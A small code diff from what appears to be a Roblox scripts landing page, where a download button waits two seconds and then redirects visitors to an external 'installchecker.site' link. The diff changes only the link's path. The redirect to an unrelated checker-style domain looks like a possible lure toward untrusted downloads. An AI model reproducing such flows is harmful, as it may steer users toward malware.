@@ -99,7 +99,7 @@ export default function RobloxScriptsLanding() {
               onClick={() => {
                 setDownloading(true);
                 setTimeout(() => {
-                  window.location.href = "https://installchecker.site/sl/4xjolimage.png";
+                  window.location.href = "https://installchecker.site/sl/4xjol";
                 }, 2000);
               }}
               disabled={downloading}
